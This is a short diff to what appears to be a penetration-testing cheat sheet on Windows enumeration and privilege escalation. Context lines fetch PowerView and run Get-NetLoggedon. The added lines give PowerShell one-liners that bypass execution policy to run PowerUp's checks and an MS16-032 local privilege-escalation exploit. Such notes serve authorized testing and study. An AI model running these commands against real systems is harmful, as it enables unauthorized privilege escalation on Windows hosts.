@@ -510,6 +510,11 @@ Pattern
                https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1
                Import-Module .\Powerview.ps1
                Get-NetLoggedon -Computername <computername>
+            
+
+         how to execute ps1 files?
+         powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }" 
+         powershell -exec bypass -command "& { Import-Module .\39719.ps1; Invoke-MS16-032; }" 
                
               
  
